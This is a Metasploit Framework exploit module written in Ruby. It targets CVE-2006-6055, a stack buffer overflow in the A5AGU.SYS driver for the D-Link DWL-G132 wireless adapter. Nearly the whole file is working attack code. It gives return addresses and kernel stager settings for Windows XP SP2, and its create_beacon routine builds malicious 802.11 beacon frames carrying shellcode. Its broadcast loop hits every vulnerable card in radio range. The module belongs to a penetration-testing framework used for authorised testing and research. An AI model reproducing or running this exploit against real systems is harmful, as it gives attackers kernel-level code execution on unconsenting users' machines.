##
# $Id: dlink_wifi_rates.rb 9670 2010-07-03 03:19:07Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = LowRanking

	include Msf::Exploit::Lorcon2
	include Msf::Exploit::KernelMode

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'D-Link DWL-G132 Wireless Driver Beacon Rates Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the A5AGU.SYS driver provided
				with the D-Link DWL-G132 USB wireless adapter. This stack buffer overflow
				allows remote code execution in kernel mode. The stack buffer overflow is triggered
				when a 802.11 Beacon frame is received that contains a long Rates information
				element. This exploit was tested with version 1.0.1.41 of the
				A5AGU.SYS driver and a D-Link DWL-G132 USB adapter (HW: A2, FW: 1.02). Newer
				versions of the A5AGU.SYS driver are provided with the D-Link WUA-2340
				adapter and appear to resolve this flaw, but D-Link does not offer an updated
				driver for the DWL-G132. Since this vulnerability is exploited via beacon frames,
				all cards within range of the attack will be affected. The tested adapter used
				a MAC address in the range of 00:11:95:f2:XX:XX.

				Vulnerable clients will need to have their card in a non-associated state
				for this exploit to work. The easiest way to reproduce this bug is by starting
				the exploit and then accessing the Windows wireless network browser and
				forcing it to refresh.

				D-Link was NOT contacted about this flaw. A search of the SecurityFocus
				database indicates that D-Link has not provided an official patch or
				solution for any of the seven flaws listed at the time of writing:
				(BIDs 13679, 16621, 16690, 18168, 18299, 19006, and 20689).

				As of November 17th, 2006, D-Link has fixed the flaw it the latest version of the
				DWL-G132 driver (v1.21).

				This module depends on the Lorcon2 library and only works on the Linux platform
				with a supported wireless card. Please see the Ruby Lorcon2 documentation
				(external/ruby-lorcon/README) for more information.
			},
			'Author'         =>
				[
					'hdm',	# discovery, exploit dev
					'skape', # windows kernel ninjitsu
					'Johnny Cache <johnnycsh [at] 802.11mercenary.net>' # making all of this possible
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9670 $',
			'References'     =>
				[
					['CVE', '2006-6055'],
					['OSVDB', '30296'],
					['URL', 'http://projects.info-pull.com/mokb/MOKB-13-11-2006.html'],
					['URL', 'ftp://ftp.dlink.com/Wireless/dwlg132/Driver/DWLG132_driver_102.zip'],
				],
			'Privileged'     => true,

			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},

			'Payload'        =>
				{
					# Its a beautiful day in the neighborhood...
					'Space'    => 1000
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Windows XP SP2 with the latest updates
					# 5.1.2600.2622 (xpsp_sp2_gdr.050301-1519)
					[ 'Windows XP SP2 (5.1.2600.2122), A5AGU.sys 1.0.1.41',
						{
							'Ret'      => 0x8066662c, # jmp edi
							'Platform' => 'win',
							'Payload'  =>
							{
								'ExtendedOptions' =>
								{
									'Stager'       => 'sud_syscall_hook',
									'PrependUser'  => "\x81\xC4\x54\xF2\xFF\xFF", # add esp, -3500
									'Recovery'     => 'idlethread_restart',
									'KiIdleLoopAddress' => 0x804dbb27,
								}
							}
						}
					],

					# Windows XP SP2 install media, no patches
					# 5.1.2600.2180 (xpsp_sp2_rtm_040803-2158)
					[ 'Windows XP SP2 (5.1.2600.2180), A5AGU.sys 1.0.1.41',
						{
							'Ret'      => 0x804f16eb, # jmp edi
							'Platform' => 'win',
							'Payload'  =>
							{
								'ExtendedOptions' =>
								{
									'Stager'       => 'sud_syscall_hook',
									'PrependUser'  => "\x81\xC4\x54\xF2\xFF\xFF", # add esp, -3500
									'Recovery'     => 'idlethread_restart',
									'KiIdleLoopAddress' => 0x804dc0c7,
								}
							}
						}
					]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Nov 13 2006'))

		register_options(
			[
				OptString.new('ADDR_DST', [ true,  "The MAC address to send this to",'FF:FF:FF:FF:FF:FF']),
				OptInt.new('RUNTIME', [ true,  "The number of seconds to run the attack", 60])
			], self.class)
	end

	def exploit
		open_wifi

		stime = Time.now.to_i
		rtime = datastore['RUNTIME'].to_i
		count = 0

		print_status("Sending exploit beacons for #{datastore['RUNTIME']} seconds...")
		while (stime + rtime > Time.now.to_i)
			wifi.write(create_beacon)
			select(nil, nil, nil, 0.10) if (count % 100 == 0)

			count += 1

			# Exit if we get a session
			break if session_created?
		end

		print_status("Completed sending beacons.")
	end


#
# The following research was provided by Gil Dabah of ZERT
#
# The long rates field bug can be triggered three different ways (at least):
# 1) Send a single rates IE with valid rates up front and long data
# 2) Send a single rates IE field with valid rates, follow with IE type 0x32 with long data
# 3) Send two IE rates fields, with the second one containing the long data (this exploit)
#

	def create_beacon

		ssid   = rand_text_alphanumeric(6)
		bssid  = ("\x00" * 2) + rand_text(4)
		src    = ("\x90" * 4) + "\xeb\x2b"
		seq    = [rand(255)].pack('n')

		buff  =  rand_text(75)
		buff[0, 2]  = "\xeb\x49"
		buff[71, 4] = [target.ret].pack('V')

		frame =
			"\x80" +                      # type/subtype
			"\x00" +                      # flags
			"\x00\x00" +                  # duration
			eton(datastore['ADDR_DST']) + # dst
			src   +                       # src
			bssid +                       # bssid
			seq   +                       # seq
			rand_text(8) +      # timestamp value
			"\x64\x00" +                  # beacon interval
			"\x00\x05" +                  # capability flags

			# ssid tag
			"\x00" + ssid.length.chr + ssid +

			# supported rates
			"\x01" + "\x08" + "\x82\x84\x8b\x96\x0c\x18\x30\x48" +

			# current channel
			"\x03" + "\x01" + channel.chr +

			# eip was his name-o
			"\x01" + buff.length.chr + buff +

			payload.encoded

		return frame
	end

end